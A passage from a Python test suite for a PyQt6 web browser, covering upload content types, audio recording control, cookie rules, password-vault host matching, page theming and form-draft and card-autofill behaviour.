            _types[_P246(request.url().path()).suffix] = (
                request.header(B.QNetworkRequest.KnownHeaders
                               .ContentTypeHeader) or "")
            return _Reply()
    _real_nam = br._nam
    br._nam = _Nam()
    br.config["shotUpload"] = "https://up246.example/x"
    try:
        for ext in (".webp", ".jpg", ".png", ".xyz"):
            f = _dir246 / ("u246" + ext)
            f.write_bytes(b"x")
            br.upload_capture(path=str(f))
    finally:
        br._nam = _real_nam
    _types = {k: (v.decode() if isinstance(v, bytes) else str(v))
              for k, v in _types.items()}
    check("245 an upload carries the content type of its file",
          _types.get(".webp") == "image/webp"
          and _types.get(".jpg") == "image/jpeg"
          and _types.get(".png") == "image/png"
          and _types.get(".xyz") == "application/octet-stream", str(_types))

    # 246: sound-only recording can be stopped from the menu, and a second
    # start does not leak the first
    _fake = _dir246 / "parec-fake"
    _fake.write_text('#!/bin/sh\nfor last; do :; done\n'
                     'echo wav > "$last"\nexec sleep 30\n')
    _fake.chmod(_fake.stat().st_mode | _stat246.S_IXUSR)
    br.record_tools = lambda: {"recorder": str(_fake), "ffmpeg": "",
                               "tesseract": ""}
    _first = _second_p = None
    try:
        br._record_audio_start(False)
        _first = getattr(br, "_audio_proc", None)
        _first.waitForStarted(3000)
        _stop = br._ui_str("recStop")
        _menu = br.record_menu(B.QMenu())
        _has_stop = _stop in [a.text() for a in _menu.actions()]
        br._record_audio_start(True)
        _second_p = br._audio_proc
        # waitForFinished answers False for a process already over,
        # which is exactly what the fix makes it
        _ended = (_first.state() == B.QProcess.ProcessState.NotRunning
                  or _first.waitForFinished(3000))
        _menu = br.record_menu(B.QMenu())
        _acts = [a for a in _menu.actions() if a.text() == _stop]
        if _acts:
            _acts[0].trigger()
        _stopped = not br._audio_running() if hasattr(br, "_audio_running") \
            else getattr(br, "_audio_proc", None) is None
        check("246 a sound-only recording shows a Stop entry and stops",
              _has_stop and bool(_acts) and _stopped,
              str((_has_stop, bool(_acts), _stopped)))
        check("246 a second sound-only start ends the first recorder",
              _ended, "first recorder still running")
        check("246 the sound it recorded is kept",
              any(f.suffix == ".wav" and f.stat().st_size
                  for f in _dir246.iterdir()))
    finally:
        for p in (_first, _second_p):
            try:
                if p is not None and p.state() != B.QProcess.ProcessState.NotRunning:
                    p.kill()
                    p.waitForFinished(1000)
            except RuntimeError:
                pass
        br._audio_proc = None
        del br.record_tools

    # 246: a region is cut in device pixels
    _rec = _cap246.Recording(fps=10, seconds=0)
    _rec.region = (10, 20, 100, 50)
    _rv = _V246()
    _rv.ratio = 2.0
    _rec.view = _rv
    _rec.audio_path = ""
    _rects = []
    _old_rec = getattr(br, "_recording", None)
    br._recording = _rec
    _cap246.area = lambda view, rect: (_rects.append(list(rect))
                                       or _img246(10, 10))
    try:
        br._record_tick()
    finally:
        _cap246.area = _real_area
        br._recording = _old_rec
    check("246 a region recording scales its rectangle by the screen ratio",
          _rects == [[20.0, 40.0, 200.0, 100.0]], str(_rects))
finally:
    _restore246()
    _tmp246.cleanup()

# ---- 247: cookie rules: "until close" really wipes, allowed subdomains stay ----
from PyQt6.QtNetwork import QNetworkCookie as _QNC247
_rules_was247 = dict(br.cookie_rules())
_queued_was247 = set(br._cookies_until_close)
_calls247 = []
br.clear_site_data = lambda host, by_rule=False: _calls247.append(
    (host, by_rule))
try:
    br.config["cookieRules"] = {"close247.example": "close",
                                "sub.close247.example": "allow"}
    br._cookies_until_close = {"changed247.example", "close247.example"}
    br.clear_until_close()
finally:
    del br.clear_site_data
check("247 the exit wipe takes every 'until close' site, and not one "
      "switched back to allow", _calls247 == [("close247.example", True)],
      str(_calls247))


class _Store247:
    def __init__(self, domains):
        self._live = {}
        for d in domains:
            c = _QNC247(b"c", b"v")
            c.setDomain(d)
            self._live[(d, "/", b"c")] = c
        self.deleted = []

    def deleteCookie(self, cookie):
        self.deleted.append(cookie.domain())


_st247 = _Store247([".p247.example", "sub.p247.example", "x.p247.example"])
try:
    br.config["cookieRules"] = {"p247.example": "close",
                                "sub.p247.example": "allow"}
    try:
        B.Browser._delete_host_cookies(
            _st247, "p247.example",
            lambda d: br.cookie_rule_for(d) == "allow")
    except TypeError:          # no keep= before the fix
        _st247.deleted = ["no keep"]
    _keeps247 = []
    br._delete_host_cookies = lambda store, host, keep=None: \
        _keeps247.append(keep is not None)
    br.flash = lambda *a, **k: None
    try:
        try:
            br.clear_site_data("nothere247.example", by_rule=True)
        except TypeError:      # no by_rule before the fix
            _keeps247.append(None)
        br.clear_site_data("nothere247.example")
    finally:
        del br._delete_host_cookies, br.flash
finally:
    br.config["cookieRules"] = dict(_rules_was247)
check("247 a rule on a site leaves the cookies of a subdomain allowed by name",
      sorted(_st247.deleted) == [".p247.example", "x.p247.example"]
      and _keeps247[:1] == [True] and _keeps247[-1:] == [False],
      str((_st247.deleted, _keeps247)))
try:
    br.config["cookieRules"] = {}
    br.cookie_rule("bücher247.example", "close")
    _idn247 = (br.cookie_rule_for("xn--bcher247-65a.example"),
               br.cookie_rule_for(".xn--bcher247-65a.example"),
               br.cookie_rule("bücher247.example"))
    br.config["cookieRules"] = {"bücher247b.example": "block"}
    _old247 = br.cookie_rule_for("xn--bcher247b-q9a.example")
finally:
    br.config["cookieRules"] = dict(_rules_was247)
    br._cookies_until_close = set(_queued_was247)
check("247 a rule for an international site covers its cookies (xn-- form), "
      "old rules too", _idn247 == ("close", "close", "close")
      and _old247 == "block", str((_idn247, _old247)))


class _Sig247:
    def connect(self, fn):
        pass


class _FakeStore247:
    def __init__(self):
        self.cookieAdded = _Sig247()
        self.cookieRemoved = _Sig247()
        self.loads = 0

    def loadAllCookies(self):
        self.loads += 1


class _FakeProfile247:
    def __init__(self):
        self.store = _FakeStore247()

    def cookieStore(self):
        return self.store

    def isOffTheRecord(self):
        return False

    def storageName(self):
        return "fake247"


try:
    br.config["cookieRules"] = {"w247.example": "close"}
    _pa247 = _FakeProfile247()
    br.watch_cookies(_pa247)
    br.config["cookieRules"] = {}
    _pb247 = _FakeProfile247()
    br.watch_cookies(_pb247)
finally:
    br.config["cookieRules"] = dict(_rules_was247)
check("247 with an 'until close' rule the jar reports its old cookies at start",
      _pa247.store.loads == 1 and _pb247.store.loads == 0,
      str((_pa247.store.loads, _pb247.store.loads)))

# ---- 248: whole cookie values, http cookies, private permissions forgotten ----
_c248 = _QNC247(b"long248", b"v" * 3000)
_c248.setDomain("long248.example")
_c248.setPath("/")
br._note_cookie(_c248, jar="main")
_row248 = (getattr(br, "_cookie_seen", None) or {}).pop(
    "main|long248.example|/|long248", {})
check("248 the cookie editor keeps a long cookie's whole value",
      len(_row248.get("value", "")) == 3000, str(len(_row248.get("value", ""))))


class _View248:
    def __init__(self, url):
        self._u = B.QUrl(url)

    def url(self):
        return self._u


_secure248 = []
_made248 = []


def _note248(cookie, jar=""):
    _secure248.append(bool(cookie.isSecure()))
    _made248.append(_QNC247(cookie))


br._note_cookie = _note248
try:
    for _u248 in ("http://plain248.example/", "https://tls248.example/"):
        _fv248 = _View248(_u248)
        br.current = lambda _v=_fv248: _v
        br._live_page = lambda v: None
        br.set_cookie("n248", "1")
        del br.current, br._live_page
finally:
    for _n in ("_note_cookie", "current", "_live_page"):
        br.__dict__.pop(_n, None)
    for _ck in _made248:
        try:
            br.profile.cookieStore().deleteCookie(_ck)
        except RuntimeError:
            pass
check("248 a cookie made on an http page is not Secure, one on https is",
      _secure248 == [False, True], str(_secure248))
_pk248 = "https://fp248.example|use the microphone"
br._private_perms[_pk248] = True
br.forget_site("fp248.example")
check("248 forgetting a site forgets what its private tabs were allowed",
      _pk248 not in br._private_perms, str(list(br._private_perms)[:5]))
br._private_perms.pop(_pk248, None)

# ---- 249: a vault row with no site fills no page, a dotted host included ----
class _V249:
    normalize_host = B.PasswordVault.normalize_host

    def logins(self):
        return [{"host": "", "scheme": "https", "username": "nosite249",
                 "used": 2},
                {"host": "bank249.example", "scheme": "https",
                 "username": "bank249", "used": 1}]


_e1 = [e["username"] for e in
       B.PasswordVault.entries_for(_V249(), "evil249.example.", "https")]
_e2 = [e["username"] for e in
       B.PasswordVault.entries_for(_V249(), "x.bank249.example", "https")]
check("249 a login with no site is offered to no page (not 'evil.example.')",
      _e1 == [] and _e2 == ["bank249"], str((_e1, _e2)))

# ---- 250-252: the 45th pass: theme exclusions, colours, undo, look ----
_ABSENT252 = "__absent__"


def _cfg252(keys):
    return {k: br.config.get(k, _ABSENT252) for k in keys}


def _restore252(saved):
    for k, v in saved.items():
        if v == _ABSENT252:
            br.config.pop(k, None)
        else:
            br.config[k] = v


# 250: both exclusion lists are bare ACE hosts, however they were written
_keys250 = ("themeWeb", "themeWebSkip", "darkSiteRules")
_old250 = _cfg252(_keys250)
_ace250 = "bücher250.example".encode("idna").decode()
_acet250 = "tür250.example".encode("idna").decode()
try:
    br.config["themeWeb"] = True
    br.config["themeWebSkip"] = ["https://Bücher250.example/path",
                                 "Www.Other250.example:8080"]
    br.config["darkSiteRules"] = ["*.Tür250.example"]
    _skip250 = B.theme_web._skipped(br)
    check("250 a typed or Unicode entry reaches the page script as its "
          "bare ACE host",
          _ace250 in _skip250 and "other250.example" in _skip250
          and _acet250 in _skip250, str(_skip250))
    check("250 the script source carries the ACE name, not the Unicode one",
          json.dumps(_ace250) in B.theme_web._source(br)
          and "bücher250" not in B.theme_web._source(br))
    check("250 a page on the Unicode or the ACE host is not themed",
          not B.theme_web.themes_host(br, "bücher250.example")
          and not B.theme_web.themes_host(br, _ace250)
          and not B.theme_web.themes_host(br, "x.other250.example"))
    check("250 site_left_alone folds the page host the same way",
          br.site_left_alone("tür250.example")
          and br.site_left_alone("sub.tür250.example"))
    br.set_dark_site_rules(["https://Foo250.example/x", "Bücher250.example:81",
                            "  "])
    check("250 set_dark_site_rules stores bare ACE hosts",
          br.config.get("darkSiteRules") == ["foo250.example", _ace250],
          str(br.config.get("darkSiteRules")))
    _themed250 = B.theme_web.toggle_host(br, "bücher250.example")
    check("250 'Theme this site' on an IDN host removes its entry",
          _themed250 is True and _ace250 not in B.theme_web.own_hosts(br)
          and _ace250 not in (br.config.get("darkSiteRules") or []),
          str((_themed250, br.config.get("themeWebSkip"))))
finally:
    _restore252(_old250)
    br.set_dark_site_rules(br.config.get("darkSiteRules") or [])
    _restore252(_old250)
    br.save_config()

# 251: oklch()/lab() colours are read, and undo keeps the site's latest value
_v251 = br.new_tab(url=srv.url("/twhome"), switch=False)
try:
    H.wait_for(lambda: "twhome" in _v251.url().toString(), 8000)
    H.spin(500)
    _js251 = B.theme_web.SITE_JS.replace("%%", "%")
    _pa251 = _js251.index("  function parseColor(s) {")
    _pb251 = _js251.index("  function lum(c)")
    _got251 = H.js(_v251, "(function(){" + _js251[_pa251:_pb251] + """
      return JSON.stringify([parseColor('oklch(0.97 0 0)'),
        parseColor('rgb(1, 2, 3)'), parseColor('rgba(0, 0, 0, 0)'),
        parseColor('transparent'), parseColor('nonsense'),
        parseColor('#abc'), parseColor('lab(50 0 0)')]);})()""")
    _c251 = json.loads(_got251)
    check("251 an oklch() colour is read as an opaque grey",
          _c251[0] is not None and 238 <= _c251[0]["r"] <= 252
          and _c251[0]["a"] == 1, _got251)
    check("251 a lab() colour is read too",
          _c251[6] is not None and 90 <= _c251[6]["g"] <= 140, _got251)
    check("251 rgb(), rgba(), #hex, transparent and nonsense read as before",
          _c251[1] == {"r": 1, "g": 2, "b": 3, "a": 1}
          and _c251[2]["a"] == 0 and _c251[3] is None and _c251[4] is None
          and _c251[5] == {"r": 170, "g": 187, "b": 204, "a": 1}, _got251)
    _ra251 = _js251.index("  // a re-theme (dark to light)")
    _rb251 = _js251.index("  // Has the page moved under us")
    _undo251 = H.js(_v251, "(function(){var PROPS=['color'], "
                    "orig=new WeakMap(), stats={reputs:0};"
                    + _js251[_ra251:_rb251] + """
      var el=document.createElement('div');
      el.style.setProperty('color','blue');
      var saved={inl:{color:[el.style.getPropertyValue('color'),'']},
                 set:false, put:{}};
      orig.set(el, saved);
      put(el, saved, 'color', 'red');
      el.style.setProperty('color', 'green');
      reput(el);
      var themed=el.style.getPropertyValue('color')+' '
                 +el.style.getPropertyPriority('color');
      restore(el, saved);
      return [themed, el.style.getPropertyValue('color')];})()""")
    check("251 undo gives back the colour the site set while themed",
          _undo251 == ["red important", "green"], str(_undo251))
finally:
    _close_if_open(_v251)

# 252: force-dark honours "leave alone"; the split half; the evening edge
_keys252 = ("themeWeb", "darkSiteRules", "nightDim")
_old252 = _cfg252(_keys252)
br.force_dark_on = lambda: True
try:
    br.config["themeWeb"] = False
    br.config["darkSiteRules"] = ["left252.example"]
    _q252 = B.QUrl("https://left252.example/")
    _o252 = B.QUrl("https://other252.example/")
    check("252 a site on 'leave alone' is neither themed nor force-darkened",
          br.page_darkening(_q252) == "none"
          and br.page_darkening(B.QUrl("https://a.left252.example/"))
          == "none", br.page_darkening(_q252))
    check("252 any other site is still force-darkened",
          br.page_darkening(_o252) == "force", br.page_darkening(_o252))
finally:
    br.__dict__.pop("force_dark_on", None)
    _restore252(_old252)


class _Page252:
    def __init__(self):
        self.ran = []

    def runJavaScript(self, src, world=None, cb=None):
        self.ran.append(src)


class _Split252:
    def __init__(self):
        self._p = _Page252()

    def page(self):
        return self._p


_split252 = _Split252()
_oldsplit252 = getattr(br, "_split_view", None)
br._split_view = _split252
try:
    br.refresh_page_look()
    check("252 the live page look reaches the half of a split view",
          bool(_split252._p.ran), str(len(_split252._p.ran)))
finally:
    br._split_view = _oldsplit252

_calls252 = []
try:
    br.config["nightDim"] = 20
    br._arm_evening_timer()
    _watch252 = getattr(br, "_evening_watch", None)
    check("252 a repeating check of the clock runs while the dimmer is on",
          _watch252 is not None and _watch252.isActive()
          and _watch252.interval() <= 60000, str(_watch252))
    br.refresh_page_look = lambda live=True: _calls252.append(1)
    now252 = B.evening_now(br.config)
    br._evening_applied = now252
    br._evening_recheck()
    _quiet252 = len(_calls252)
    br._evening_applied = not now252
    br._evening_recheck()
    check("252 the check refreshes the pages only when the evening changed",
          _quiet252 == 0 and len(_calls252) == 1,
          str((_quiet252, len(_calls252))))
except AttributeError as e:
    check("252 the check refreshes the pages only when the evening changed",
          False, repr(e)[:80])
finally:
    br.__dict__.pop("refresh_page_look", None)
    _restore252(_old252)
    br._arm_evening_timer()

# ---- 253-255: forms, the 46th pass ----
import copy as _copy253


class _Page253:
    pass


class _View253:
    """A tab as far as the form code asks: an address, a private flag."""
    def __init__(self, url, private=False):
        self._u = B.QUrl(url)
        self.private = private
        self._pg = _Page253()

    def url(self):
        return self._u

    def page(self):
        return self._pg


def _keys253(*urls):
    return [br._draft_key(_View253(u)) for u in urls]


# 253: the key is the page, not host+path
_k253 = _keys253("https://f253.example/thread?id=5",
                 "https://f253.example/thread?id=9",
                 "https://f253.example/thread?id=5&utm_source=x&fbclid=1",
                 "http://f253.example/thread?id=5",
                 "https://f253.example:8443/thread?id=5",
                 "https://f253.example/thread")
_long253 = br._draft_key(_View253("https://f253.example/" + "p" * 400
                                  + "?id=5"))
check("253 a draft key tells apart the query, the scheme and the port",
      _k253[0] != _k253[1] and _k253[0] == _k253[2]
      and len({_k253[0], _k253[3], _k253[4], _k253[5]}) == 4
      and len(_long253) <= 200
      and _long253 != br._draft_key(_View253(
          "https://f253.example/" + "p" * 400 + "?id=6")),
      str(_k253))

_cfg253 = {n: _copy253.deepcopy(br.config.get(n, "__absent__"))
           for n in ("formDrafts", "formDraftsOn", "formHistory",
                     "formHistoryOn", "warnForms")}


def _restore_cfg253():
    for n, v in _cfg253.items():
        if v == "__absent__":
            br.config.pop(n, None)
        else:
            br.config[n] = _copy253.deepcopy(v)


def _fake_ft253(replies, seen):
    def ft(name, view=None, then=None, arg=None):
        seen.append((name, arg))
        out = replies.get(name, "0" if name == "restoreform" else "[]")
        if isinstance(out, list):
            out = out.pop(0) if len(out) > 1 else out[0]
        if then:
            then(out)
        return True
    return ft


br.save_config = lambda *a, **k: None
try:
    br.config["formDraftsOn"] = True
    # 253: a sent form drops its draft; an old one is not put back
    _v253 = _View253("https://f253.example/contact")
    _key253 = br._draft_key(_v253)
    _rows253 = [{"key": "#msg", "value": "already sent text"}]
    br.config["formDrafts"] = {_key253: {"rows": _rows253,
                                         "when": int(_time.time())}}
    _seen253 = []
    br.form_tool = _fake_ft253({"formvalues": json.dumps(_rows253)},
                               _seen253)
    _sent = getattr(br, "_form_sent", None)

    class _Self253:
        browser = br
        _view = _v253
        console_log = []

    class _Lvl253:
        name = "InfoMessageLevel"
    try:
        B.WebPage.javaScriptConsoleMessage(_Self253, _Lvl253, "browser-form-sent",
                                           1, "")
    except Exception:
        pass
    _gone253 = _key253 not in br.form_drafts()
    check("253 a sent form's draft is dropped (the page tells the console hook)",
          _gone253 and not _Self253.console_log,
          str((_gone253, _Self253.console_log)))
    # the script that says so is in the page tools
    check("253 the page tools watch for a sent form",
          "browser-form-sent" in B.FORM_TOOLS.get("formvalues", "")
          and "browser-form-sent" in B.FORM_TOOLS.get("restoreform", "")
          or "browser-form-sent" in getattr(B, "FORM_PICK", ""))
    # a text that is still standing in the boxes of a page that stayed is
    # not written down again
    _t253 = []
    br.save_form_draft(view=_v253, then=_t253.append)
    check("253 ...and the text still in its boxes is not saved again",
          _key253 not in br.form_drafts(), str(list(br.form_drafts())))
    # a week old: not put back
    br.config["formDrafts"] = {_key253: {"rows": _rows253,
                                         "when": int(_time.time())
                                         - 8 * 86400}}
    _seen253.clear()
    br.restore_form_draft(view=_v253)
    _stale_used = any(n == "restoreform" for n, _a in _seen253)
    br.config["formDrafts"] = {_key253: {"rows": _rows253,
                                         "when": int(_time.time())}}
    _seen253.clear()
    br.restore_form_draft(view=_v253)
    _fresh_used = any(n == "restoreform" for n, _a in _seen253)
    check("253 a draft older than a week is not restored, a fresh one is",
          _fresh_used and not _stale_used, str((_fresh_used, _stale_used)))
    # saving drops the stale ones
    br.config["formDrafts"] = {"old/x": {"rows": _rows253, "when": 1},
                               "https://other.example/": {
                                   "rows": _rows253, "when": 1}}
    _v253b = _View253("https://f253b.example/c")
    br.form_tool = _fake_ft253({"formvalues": json.dumps(
        [{"key": "#a", "value": "typed"}])}, _seen253)
    br.save_form_draft(view=_v253b)
    check("253 saving a draft expires the ones older than a week",
          list(br.form_drafts()) == [br._draft_key(_v253b)],
          str(list(br.form_drafts())))

    # 253: a box typed in before the restore found the others is merged
    _v253c = _View253("https://f253c.example/c")
    _key253c = br._draft_key(_v253c)
    br.config["formDrafts"] = {_key253c: {"when": int(_time.time()), "rows": [
        {"key": "#a", "value": "one"}, {"key": "#b", "value": "two"},
        {"key": "#c", "value": "three"}]}}
    br.form_tool = _fake_ft253({"formvalues": json.dumps(
        [{"key": "#b", "value": "two, longer"}])}, _seen253)
    _v253c._draft_pending = _key253c
    br.save_form_draft(view=_v253c)
    _rows_c = {r["key"]: r["value"] for r in
               br.form_drafts().get(_key253c, {}).get("rows", [])}
    check("253 until a restore worked, typing one box adds to the draft",
          _rows_c == {"#a": "one", "#b": "two, longer", "#c": "three"},
          str(_rows_c))
    # ...and the restore asks again while the boxes are missing
    _asked253 = []

    def _late253(name, view=None, then=None, arg=None):
        if name == "restoreform":
            _asked253.append(1)
            if then:
                then("0" if len(_asked253) < 2 else "3")
        return True
    br.form_tool = _late253
    _retry = getattr(br, "_restore_with_retries", None)
    if _retry:
        _retry(_v253c)
        H.wait_for(lambda: len(_asked253) >= 2, 5000)
    check("253 a restore that found no boxes is tried again",
          len(_asked253) >= 2 and _v253c._draft_pending is None,
          str((_asked253, _v253c._draft_pending)))
finally:
    br.__dict__.pop("form_tool", None)
    br.__dict__.pop("save_config", None)
    _restore_cfg253()

# 254: clear history, forget site and the per-browser wipe take the form data
_cfg254 = {n: _copy253.deepcopy(br.config.get(n, "__absent__"))
           for n in ("formDrafts", "formHistory")}


def _rows254():
    br.config["formDrafts"] = {
        "https://a254.example/p": {"rows": [], "when": 9},
        "http://sub.a254.example:8080/x": {"rows": [], "when": 9},
        "a254.example/old": {"rows": [], "when": 9},
        "https://nota254.example/p": {"rows": [], "when": 9}}
    br.config["formHistory"] = {
        "https://a254.example": {"city": ["Berlin"]},
        "http://x.a254.example:81": {"city": ["Bonn"]},
        "a254.example": {"city": ["Ulm"]},
        "nota254.example": {"city": ["Kiel"]}}


try:
    _rows254()
    br._forget_history_extras(None)
    check("254 clearing the history clears the drafts and the box values",
          not br.config.get("formDrafts") and not br.config.get("formHistory"),
          str((br.config.get("formDrafts"), br.config.get("formHistory"))))
    _rows254()
    br.forget_site("a254.example")
    check("254 forgetting a site forgets its drafts and box values, "
          "subdomains too, never a name that only ends the same way",
          list(br.config.get("formDrafts", {})) ==
          ["https://nota254.example/p"]
          and list(br.config.get("formHistory", {})) == ["nota254.example"],
          str((list(br.config.get("formDrafts", {})),
               list(br.config.get("formHistory", {})))))
    _rows254()
    br.clear_form_history("a254.example")
    check("254 'clear this site's values' takes its subdomains and both key shapes",
          list(br.config.get("formHistory", {})) == ["nota254.example"],
          str(list(br.config.get("formHistory", {}))))
    # one virtual browser's history wiped: the form data of the sites only it visited
    _rows254()
    br.config["formHistory"] = {"https://sess254.example": {"c": ["x"]},
                                "https://main254.example": {"c": ["y"]}}
    br.config["formDrafts"] = {}
    _hist254 = br.history
    br.save_history = lambda *a, **k: None
    br.history = [
        {"url": "https://sess254.example/", "t": 1, "s": "s254"},
        {"url": "https://main254.example/", "t": 2}]
    try:
        br._forget_session_history("s254")
    except Exception as e:
        print("   (session wipe raised %r)" % (e,))
    finally:
        br.history = _hist254
        br.__dict__.pop("save_history", None)
    check("254 a virtual browser's history wipe takes the box values of its sites only",
          list(br.config.get("formHistory", {})) ==
          ["https://main254.example"],
          str(list(br.config.get("formHistory", {}))))

    # 254: box values by origin; old host rows only on https
    br.config["formHistory"] = {"old254.example": {"name": ["Old"]}}
    br.config["formHistoryOn"] = True
    br.save_config = lambda *a, **k: None
    _sec = _View253("https://h254.example/")
    _plain = _View253("http://h254.example/")
    _seen254 = []
    br.form_tool = _fake_ft253({"formvalues": json.dumps(
        [{"key": "#city", "value": "Berlin"}])}, _seen254)
    br.note_form_values(view=_sec)
    _tab254 = list(br.config["formHistory"])
    _seen254.clear()
    br.config["formHistory"]["https://old254.example"] = {"x": ["y"]}
    _got_plain = br.offer_form_history(view=_plain)
    _got_sec = br.offer_form_history(view=_sec)
    _args = [a for n, a in _seen254 if n == "suggest"]
    br.config["formHistory"]["old254.example"] = {"name": ["Old"]}
    _seen254.clear()
    br.offer_form_history(view=_View253("https://old254.example/"))
    _old_https = [a for n, a in _seen254 if n == "suggest"]
    _seen254.clear()
    _old_http = br.offer_form_history(view=_View253("http://old254.example/"))
    check("254 box values are kept per origin, and an https page's are not offered to http",
          "https://h254.example" in _tab254 and "h254.example" not in _tab254
          and _got_plain is False and _got_sec is True
          and _args and "city" in _args[0],
          str((_tab254, _got_plain, _got_sec, _args)))
    check("254 old host-keyed values are offered to https pages only",
          _old_https and _old_https[0].get("name") == ["Old"]
          and _old_http is False, str((_old_https, _old_http)))
finally:
    br.__dict__.pop("form_tool", None)
    br.__dict__.pop("save_config", None)
    for n, v in _cfg254.items():
        if v == "__absent__":
            br.config.pop(n, None)
        else:
            br.config[n] = _copy253.deepcopy(v)
    _restore_cfg253()

# 255: the warning without a vault; the username box; split card expiry
_warned255 = []
_real_vault255 = br.vault
_real_warn255 = br.warn_about_form
try:
    br.vault = None
    br.config["warnForms"] = True
    br.config["formDraftsOn"] = False
    br.config["formHistoryOn"] = False
    br.form_tool = lambda *a, **k: True
    br.warn_about_form = lambda view=None, then=None: _warned255.append(1)
    br._form_settled(_View253("http://w255.example/login"))
    check("255 the form warning is run with no vault", _warned255 == [1],
          str(_warned255))
    br.__dict__.pop("warn_about_form", None)
    _flashed255 = []
    _real_flash255 = br.flash
    br.flash = lambda text, ms=2600: _flashed255.append(text)
    br.form_facts = lambda view=None, then=None: then(
        {"passwords": 1, "insecure": True, "signup": True}) or True
    _said255 = []
    br.warn_about_form(view=_View253("http://w255.example/login"),
                       then=_said255.append)
    check("255 ...and with no vault it says the http warning, not the account hint",
          _said255 == [["insecure"]], str(_said255))
finally:
    br.vault = _real_vault255
    for n in ("form_tool", "warn_about_form", "form_facts", "flash"):
        br.__dict__.pop(n, None)
    _restore_cfg253()

_f255 = br.new_tab(url=srv.url("/twhome"), switch=False)
H.wait_for(lambda: "/twhome" in _f255.url().toString(), 8000)
H.spin(300)
try:
    jsq(_f255, "document.body.innerHTML = '<form id=f method=post>"
        "<input type=checkbox name=remember_login>"
        "<input type=search name=q placeholder=\"search account\">"
        "<input type=text name=email value=me@f255.example>"
        "<input type=password name=pw></form>'", B.MAIN_WORLD_ID)
    _facts255 = []
    br.form_facts(view=_f255, then=_facts255.append)
    H.wait_for(lambda: _facts255, 5000)
    check("255 the username is a text box, not a checkbox or a search box",
          _facts255 and _facts255[0].get("username") == "me@f255.example",
          str(_facts255))
    jsq(_f255, "document.body.innerHTML = '<form>"
        "<input id=num name=cardnumber autocomplete=cc-number>"
        "<select id=mm name=expmonth autocomplete=cc-exp-month>"
        "<option value=\"\">MM</option><option value=01>01</option>"
        "<option value=12>12</option></select>"
        "<input id=yr name=expyear autocomplete=cc-exp-year>"
        "<input id=cv name=cvc></form>'", B.MAIN_WORLD_ID)
    _card255 = []
    br.form_tool("fillcard", view=_f255, then=_card255.append,
                 arg={"number": "4111111111111111", "expiry": "12/27",
                      "cvv": "123"})
    H.wait_for(lambda: _card255, 5000)
    # (id "yr": an id of "yy" asks for two digits, and gets them)
    _vals255 = jsq(_f255, "[mm.value, yr.value, cv.value].join('|')",
                   B.MAIN_WORLD_ID)
    check("255 a card's month and year go into split boxes, each its own",
          _vals255 == "12|2027|123", str(_vals255))
    jsq(_f255, "document.body.innerHTML = '<form>"
        "<input id=ex name=expiry placeholder=\"MM/YY\"></form>'",
        B.MAIN_WORLD_ID)
    _card255.clear()
    br.form_tool("fillcard", view=_f255, then=_card255.append,
                 arg={"expiry": "12/27"})
    H.wait_for(lambda: _card255, 5000)
    check("255 ...and a one-box expiry still gets MM/YY",
          jsq(_f255, "ex.value", B.MAIN_WORLD_ID) == "12/27")
    # the real page: a sent form drops the draft through the console
    br.config["formDraftsOn"] = True
    jsq(_f255, "document.body.innerHTML = '<form id=f method=post "
        "onsubmit=\"return false\"><textarea id=msg></textarea></form>'",
        B.MAIN_WORLD_ID)
    _key255 = br._draft_key(_f255)
    br.form_drafts()[_key255] = {"rows": [{"key": "#msg", "value": "hi"}],
                                 "when": int(_time.time())}
    br.form_tool("formvalues", view=_f255)
    H.spin(300)
    jsq(_f255, "document.getElementById('f').dispatchEvent("
        "new Event('submit', {bubbles: true, cancelable: true}))",
        B.MAIN_WORLD_ID)
    check("253 a form sent in a real page drops its draft",
          H.wait_for(lambda: _key255 not in br.form_drafts(), 3000),
          str(list(br.form_drafts())))
finally:
    _restore_cfg253()
    br.close_tab(br.tabs.indexOf(_f255), ask=False)

# ---- 253b: old draft keys, partial restores, formmethod, sealed history ----
check("253b an old draft key whose path holds '://' still names its site",
      B.Browser._form_key_host("web.archive.org/web/2020/http://x.example/")
      == "web.archive.org"
      and B.Browser._form_key_host("https://new253b.example:8443/p?1")
      == "new253b.example")
_v253b = br.new_tab(url=srv.url("/twhome"), switch=False)
H.wait_for(lambda: "/twhome" in _v253b.url().toString(), 8000)
H.spin(200)
_drafts_was253b = json.loads(json.dumps(br.config.get("formDrafts") or {}))
try:
    _k253b = br._draft_key(_v253b)
    br.config["formDrafts"] = {_k253b: {
        "rows": [["#a", "one"], ["#b", "two"], ["#c", "three"]],
        "when": int(_time.time())}}
    _fills253b = [1]
    br.form_tool = lambda name, view=None, then=None, arg=None: (
        then(str(_fills253b[0])) if then else None) or True
    br.flash = lambda *a, **k: None
    _v253b._draft_pending = _k253b
    br.restore_form_draft(view=_v253b, quiet=True)
    _after_one = getattr(_v253b, "_draft_pending", None)
    _fills253b[0] = 3
    br.restore_form_draft(view=_v253b, quiet=True)
    _after_all = getattr(_v253b, "_draft_pending", None)
finally:
    for _n in ("form_tool", "flash"):
        br.__dict__.pop(_n, None)
    br.config["formDrafts"] = _drafts_was253b
check("253b a draft half restored keeps merging; all of it back ends that",
      _after_one == _k253b and _after_all is None,
      str((_after_one, _after_all)))
_close_if_open(_v253b)
check("253b a submit button's formmethod=post counts as a sent form",
      'getAttribute("formmethod")' in B.FORM_PICK)
_fh_was253b = json.loads(json.dumps(br.config.get("formHistory") or {}))
_lock_was253b = getattr(br, "_history_locked", False)
try:
    br.config["formHistory"] = {"https://locked253b.example": {"q": ["x"]}}
    br._history_locked = True
    _gone253b = br._forget_form_data_after(
        [{"url": "https://locked253b.example/a"}])
    _kept253b = "https://locked253b.example" in br.config["formHistory"]
finally:
    br._history_locked = _lock_was253b
    br.config["formHistory"] = _fh_was253b
check("253b with sealed history locked, a session wipe keeps form data",
      _gone253b is False and _kept253b, str((_gone253b, _kept253b)))

# ---- 256-258: the 47th pass (keys and input) ----
# Appended to tests/test_review.py, above the closing "the suite's own window"
# check. Uses H, B, br, srv, check, jsq, json, _close_if_open from above.
from PyQt6.QtGui import (QMouseEvent as _QME258, QWheelEvent as _QWE258,
                         QKeyEvent as _QKE258,
                         QContextMenuEvent as _QCM258)
from PyQt6.QtCore import QPointF as _QPF258, QPoint as _QP258, \
    QObject as _QO258
from PyQt6.QtTest import QTest as _QT258

# 256: a key typed into a field inside a shadow root is typing, for the vim
# keys and for noKeyGrab; and "g" then Shift+T is still gT
_vim_was258 = br.config.get("vimKeys", False)
_nav_was258 = br.config.get("nav")
br.config["vimKeys"] = True
br.config["nav"] = {"noKeyGrab": True}
br.refresh_nav()
_v258 = br.new_tab(url=srv.url("/twhome?k258"), switch=True)
H.spin(1200)
